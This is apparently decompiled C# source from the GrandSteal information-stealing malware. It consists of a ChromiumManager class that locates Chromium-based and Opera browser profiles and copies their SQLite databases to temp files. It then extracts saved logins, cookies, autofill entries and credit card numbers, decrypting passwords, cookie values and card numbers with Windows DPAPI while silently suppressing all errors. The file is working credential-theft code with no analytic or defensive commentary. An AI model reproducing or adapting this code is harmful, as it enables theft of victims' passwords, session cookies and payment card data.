using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using GrandSteal.Client.Data.SQLite;
using GrandSteal.Client.Models.Credentials;
using GrandSteal.Client.Models.Extensions.Nulls;
using GrandSteal.SharedModels.Models;

namespace GrandSteal.Client.Data.Recovery
{
	// Token: 0x0200001A RID: 26
	public class ChromiumManager : ICredentialsManager<BrowserProfile>
	{
		// Token: 0x1700003D RID: 61
		// (get) Token: 0x060000AA RID: 170 RVA: 0x000025AE File Offset: 0x000007AE
		public Dictionary<string, string> BrowsersRoot { get; }

		// Token: 0x060000AB RID: 171 RVA: 0x000025B6 File Offset: 0x000007B6
		public ChromiumManager(Dictionary<string, string> roots = null)
		{
			this.BrowsersRoot = (roots ?? ChromiumManager.SearchBrowsersRoots(Path.Combine(Environment.ExpandEnvironmentVariables("%USERPROFILE%"), "AppData\\Local"), "User Data", 1));
		}

		// Token: 0x060000AC RID: 172 RVA: 0x00005128 File Offset: 0x00003328
		public IEnumerable<BrowserProfile> GetAll()
		{
			List<BrowserProfile> list = new List<BrowserProfile>();
			try
			{
				foreach (KeyValuePair<string, string> keyValuePair in this.BrowsersRoot)
				{
					try
					{
						if (keyValuePair.Key != "Opera")
						{
							using (IEnumerator<string> enumerator2 = ChromiumManager.ExtractProfiles(keyValuePair.Value).GetEnumerator())
							{
								while (enumerator2.MoveNext())
								{
									string text = enumerator2.Current;
									try
									{
										BrowserProfile browserProfile = new BrowserProfile
										{
											Name = ChromiumManager.BrowserName(keyValuePair.Value),
											Profile = ChromiumManager.ProfileName(text),
											BrowserCookies = new List<BrowserCookie>(ChromiumManager.ExtractCookies(text).IsNull<IEnumerable<BrowserCookie>>()).IsNull<List<BrowserCookie>>(),
											BrowserCredendtials = new List<BrowserCredendtial>(ChromiumManager.ExtractCredentials(text).IsNull<IEnumerable<BrowserCredendtial>>()).IsNull<List<BrowserCredendtial>>(),
											BrowserAutofills = new List<BrowserAutofill>(ChromiumManager.ExtractAutofills(text).IsNull<IEnumerable<BrowserAutofill>>()).IsNull<List<BrowserAutofill>>(),
											BrowserCreditCards = new List<BrowserCreditCard>(ChromiumManager.ExtractCreditCards(text).IsNull<IEnumerable<BrowserCreditCard>>()).IsNull<List<BrowserCreditCard>>()
										};
										if (browserProfile.BrowserCookies.Count((BrowserCookie x) => x.IsNotNull<BrowserCookie>()) <= 0)
										{
											if (browserProfile.BrowserCredendtials.Count((BrowserCredendtial x) => x.IsNotNull<BrowserCredendtial>()) <= 0)
											{
												if (browserProfile.BrowserCreditCards.Count((BrowserCreditCard x) => x.IsNotNull<BrowserCreditCard>()) <= 0)
												{
													if (browserProfile.BrowserAutofills.Count((BrowserAutofill x) => x.IsNotNull<BrowserAutofill>()) <= 0)
													{
														continue;
													}
												}
											}
										}
										list.Add(browserProfile);
									}
									catch
									{
									}
								}
								continue;
							}
						}
						BrowserProfile browserProfile2 = new BrowserProfile
						{
							Name = keyValuePair.Key,
							Profile = "Default",
							BrowserCookies = new List<BrowserCookie>(ChromiumManager.ExtractCookies(keyValuePair.Value).IsNull<IEnumerable<BrowserCookie>>()).IsNull<List<BrowserCookie>>(),
							BrowserCredendtials = new List<BrowserCredendtial>(ChromiumManager.ExtractCredentials(keyValuePair.Value).IsNull<IEnumerable<BrowserCredendtial>>()).IsNull<List<BrowserCredendtial>>(),
							BrowserAutofills = new List<BrowserAutofill>(ChromiumManager.ExtractAutofills(keyValuePair.Value).IsNull<IEnumerable<BrowserAutofill>>()).IsNull<List<BrowserAutofill>>(),
							BrowserCreditCards = new List<BrowserCreditCard>(ChromiumManager.ExtractCreditCards(keyValuePair.Value).IsNull<IEnumerable<BrowserCreditCard>>()).IsNull<List<BrowserCreditCard>>()
						};
						if (browserProfile2.BrowserCookies.Count((BrowserCookie x) => x.IsNotNull<BrowserCookie>()) <= 0)
						{
							if (browserProfile2.BrowserCredendtials.Count((BrowserCredendtial x) => x.IsNotNull<BrowserCredendtial>()) <= 0)
							{
								if (browserProfile2.BrowserCreditCards.Count((BrowserCreditCard x) => x.IsNotNull<BrowserCreditCard>()) <= 0)
								{
									if (browserProfile2.BrowserAutofills.Count((BrowserAutofill x) => x.IsNotNull<BrowserAutofill>()) <= 0)
									{
										continue;
									}
								}
							}
						}
						list.Add(browserProfile2);
					}
					catch
					{
					}
				}
			}
			catch
			{
			}
			return list;
		}

		// Token: 0x060000AD RID: 173 RVA: 0x0000550C File Offset: 0x0000370C
		public static IEnumerable<BrowserCredendtial> ExtractCredentials(string profilePath)
		{
			List<BrowserCredendtial> list = new List<BrowserCredendtial>();
			try
			{
				string text = Path.Combine(profilePath, "Ya Login Data");
				string text2 = Path.Combine(profilePath, "Login Data");
				if (!File.Exists(text) && !File.Exists(text2))
				{
					return list;
				}
				string filePath = (!File.Exists(text)) ? text2 : text;
				string empty = string.Empty;
				SQLiteManager sqliteManager = new SQLiteManager(ChromiumManager.CreateTempCopy(filePath));
				sqliteManager.ReadTable("logins");
				for (int i = 0; i < sqliteManager.GetRowCount(); i++)
				{
					BrowserCredendtial browserCredendtial = new BrowserCredendtial();
					try
					{
						browserCredendtial = ChromiumManager.OldChromeCredential(sqliteManager, i);
					}
					catch
					{
					}
					if (browserCredendtial.Login.IsNotNull<string>() && browserCredendtial.Login != "UNKNOWN" && browserCredendtial.Password != "UNKNOWN" && browserCredendtial.URL != "UNKNOWN")
					{
						list.Add(browserCredendtial);
					}
				}
			}
			catch
			{
			}
			return list;
		}

		// Token: 0x060000AE RID: 174 RVA: 0x0000561C File Offset: 0x0000381C
		public static IEnumerable<BrowserCookie> ExtractCookies(string profilePath)
		{
			List<BrowserCookie> list = new List<BrowserCookie>();
			try
			{
				string text = Path.Combine(profilePath, "Cookies");
				if (!File.Exists(text))
				{
					return list;
				}
				SQLiteManager sqliteManager = new SQLiteManager(ChromiumManager.CreateTempCopy(text));
				sqliteManager.ReadTable("cookies");
				for (int i = 0; i < sqliteManager.GetRowCount(); i++)
				{
					BrowserCookie browserCookie = null;
					try
					{
						browserCookie = new BrowserCookie
						{
							Host = sqliteManager.GetValue(i, "host_key").Trim(),
							Http = (sqliteManager.GetValue(i, "httponly") == "1"),
							Path = sqliteManager.GetValue(i, "path").Trim(),
							Secure = (sqliteManager.GetValue(i, "secure") == "1"),
							Expires = sqliteManager.GetValue(i, "expires_utc").Trim(),
							Name = sqliteManager.GetValue(i, "name").Trim(),
							Value = ChromiumManager.DecryptBlob(sqliteManager.GetValue(i, "encrypted_value"), DataProtectionScope.CurrentUser, null, false).Trim()
						};
					}
					catch
					{
					}
					if (browserCookie != null)
					{
						list.Add(browserCookie);
					}
				}
			}
			catch
			{
			}
			return list;
		}

		// Token: 0x060000AF RID: 175 RVA: 0x00005790 File Offset: 0x00003990
		public static IEnumerable<BrowserAutofill> ExtractAutofills(string profilePath)
		{
			List<BrowserAutofill> list = new List<BrowserAutofill>();
			try
			{
				string text = Path.Combine(profilePath, "Web Data");
				if (!File.Exists(text))
				{
					return list;
				}
				SQLiteManager sqliteManager = new SQLiteManager(ChromiumManager.CreateTempCopy(text));
				sqliteManager.ReadTable("autofill");
				for (int i = 0; i < sqliteManager.GetRowCount(); i++)
				{
					BrowserAutofill browserAutofill = null;
					try
					{
						browserAutofill = new BrowserAutofill
						{
							Name = sqliteManager.GetValue(i, "name").Trim(),
							Value = sqliteManager.GetValue(i, "value").Trim()
						};
					}
					catch
					{
					}
					if (browserAutofill != null)
					{
						list.Add(browserAutofill);
					}
				}
			}
			catch
			{
			}
			return list;
		}

		// Token: 0x060000B0 RID: 176 RVA: 0x00005858 File Offset: 0x00003A58
		public static IEnumerable<BrowserCreditCard> ExtractCreditCards(string profilePath)
		{
			List<BrowserCreditCard> list = new List<BrowserCreditCard>();
			try
			{
				string text = Path.Combine(profilePath, "Web Data");
				if (!File.Exists(text))
				{
					return list;
				}
				SQLiteManager sqliteManager = new SQLiteManager(ChromiumManager.CreateTempCopy(text));
				sqliteManager.ReadTable("credit_cards");
				for (int i = 0; i < sqliteManager.GetRowCount(); i++)
				{
					BrowserCreditCard browserCreditCard = null;
					try
					{
						browserCreditCard = new BrowserCreditCard
						{
							Holder = sqliteManager.GetValue(i, "name_on_card").Trim(),
							ExpirationMonth = Convert.ToInt32(sqliteManager.GetValue(i, "expiration_month").Trim()),
							ExpirationYear = Convert.ToInt32(sqliteManager.GetValue(i, "expiration_year").Trim()),
							CardNumber = ChromiumManager.DecryptBlob(sqliteManager.GetValue(i, "card_number_encrypted"), DataProtectionScope.CurrentUser, null, false).Trim()
						};
					}
					catch
					{
					}
					if (browserCreditCard != null)
					{
						list.Add(browserCreditCard);
					}
				}
			}
			catch
			{
			}
			return list;
		}

		// Token: 0x060000B1 RID: 177 RVA: 0x0000596C File Offset: 0x00003B6C
		public static string Base64Decode(string base64EncodedData)
		{
			byte[] bytes = Convert.FromBase64String(base64EncodedData);
			return Encoding.UTF8.GetString(bytes);
		}

		// Token: 0x060000B2 RID: 178 RVA: 0x000025E8 File Offset: 0x000007E8
		public static string Base64Encode(byte[] plaintText)
		{
			return Convert.ToBase64String(plaintText);
		}

		// Token: 0x060000B3 RID: 179 RVA: 0x0000598C File Offset: 0x00003B8C
		public static BrowserCredendtial OldChromeCredential(SQLiteManager manager, int row)
		{
			BrowserCredendtial browserCredendtial = new BrowserCredendtial();
			try
			{
				browserCredendtial.URL = manager.GetValue(row, "origin_url").Trim();
				browserCredendtial.Login = manager.GetValue(row, "username_value").Trim();
				browserCredendtial.Password = ChromiumManager.DecryptBlob(manager.GetValue(row, "password_value"), DataProtectionScope.CurrentUser, null, false).Trim();
			}
			catch
			{
			}
			finally
			{
				browserCredendtial.Login = (string.IsNullOrEmpty(browserCredendtial.Login) ? "UNKNOWN" : browserCredendtial.Login);
				browserCredendtial.Password = (string.IsNullOrEmpty(browserCredendtial.Password) ? "UNKNOWN" : browserCredendtial.Password);
				browserCredendtial.URL = (string.IsNullOrEmpty(browserCredendtial.URL) ? "UNKNOWN" : browserCredendtial.URL);
			}
			return browserCredendtial;
		}

		// Token: 0x060000B4 RID: 180 RVA: 0x00005A70 File Offset: 0x00003C70
		public static IEnumerable<string> ExtractProfiles(string rootPath)
		{
			List<string> list = new List<string>();
			try
			{
				if (!Directory.Exists(rootPath))
				{
					return list;
				}
				foreach (string text in Directory.GetDirectories(rootPath))
				{
					string[] files = Directory.GetFiles(text);
					if (files.IsNotNull<string[]>())
					{
						string[] array = files;
						for (int j = 0; j < array.Length; j++)
						{
							FileInfo fileInfo = new FileInfo(array[j]);
							if (fileInfo.Name == "Login Data" || fileInfo.Name == "Cookies" || fileInfo.Name == "Web Data")
							{
								list.Add(text);
								break;
							}
						}
					}
				}
			}
			catch
			{
			}
			return list;
		}

		// Token: 0x060000B5 RID: 181 RVA: 0x00005B44 File Offset: 0x00003D44
		public static string CreateTempCopy(string filePath)
		{
			string text = Path.Combine(Environment.ExpandEnvironmentVariables("%temp%"), string.Concat(new object[]
			{
				"tempDataBase",
				DateTime.Now.ToString("O").Replace(':', '_'),
				filePath.GetHashCode(),
				Thread.CurrentThread.ManagedThreadId
			}));
			File.Copy(filePath, text, true);
			return text;
		}

		// Token: 0x060000B6 RID: 182 RVA: 0x000025F0 File Offset: 0x000007F0
		public static string ProfileName(string path)
		{
			return new DirectoryInfo(path).Name.Replace(" ", "_");
		}

		// Token: 0x060000B7 RID: 183 RVA: 0x0000260C File Offset: 0x0000080C
		public static string BrowserName(string path)
		{
			string[] array = path.Split(new char[]
			{
				'\\'
			});
			return array[array.Length - 2];
		}

		// Token: 0x060000B8 RID: 184 RVA: 0x00005BBC File Offset: 0x00003DBC
		public static Dictionary<string, string> SearchBrowsersRoots(string rootDir, string dirName, int level = 1)
		{
			Dictionary<string, string> dictionary = new Dictionary<string, string>
			{
				{
					"Opera",
					Path.Combine(Environment.ExpandEnvironmentVariables("%USERPROFILE%"), "AppData\\Roaming\\Opera Software\\Opera Stable")
				}
			};
			foreach (string path in Directory.GetDirectories(rootDir))
			{
				try
				{
					if (level < 4)
					{
						DirectoryInfo directoryInfo = new DirectoryInfo(path);
						if (directoryInfo.Name == dirName)
						{
							string[] array = directoryInfo.FullName.Split(new string[]
							{
								"AppData\\Local\\"
							}, StringSplitOptions.RemoveEmptyEntries)[1].Split(new char[]
							{
								'\\'
							}, StringSplitOptions.RemoveEmptyEntries);
							if (array.Length != 0)
							{
								dictionary.Add(array[0], directoryInfo.FullName);
							}
						}
						else
						{
							foreach (KeyValuePair<string, string> keyValuePair in ChromiumManager.SearchBrowsersRoots(directoryInfo.FullName, dirName, level + 1))
							{
								if (!dictionary.ContainsKey(keyValuePair.Key))
								{
									dictionary.Add(keyValuePair.Key, keyValuePair.Value);
								}
							}
						}
					}
				}
				catch
				{
				}
			}
			return dictionary;
		}

		// Token: 0x060000B9 RID: 185 RVA: 0x00002625 File Offset: 0x00000825
		public static string DecryptBlob(string EncryptedData, DataProtectionScope dataProtectionScope, byte[] entropy = null, bool yandex = false)
		{
			return ChromiumManager.DecryptBlob(Encoding.Default.GetBytes(EncryptedData), dataProtectionScope, entropy, yandex);
		}

		// Token: 0x060000BA RID: 186 RVA: 0x00005CF4 File Offset: 0x00003EF4
		public static string DecryptBlob(byte[] EncryptedData, DataProtectionScope dataProtectionScope, byte[] entropy = null, bool yandex = false)
		{
			string result;
			try
			{
				if (EncryptedData == null || EncryptedData.Length == 0)
				{
					result = string.Empty;
				}
				else
				{
					byte[] bytes = ProtectedData.Unprotect(EncryptedData, entropy, dataProtectionScope);
					result = Encoding.UTF8.GetString(bytes);
				}
			}
			catch (CryptographicException)
			{
				result = string.Empty;
			}
			catch (Exception)
			{
				result = string.Empty;
			}
			return result;
		}
	}
}
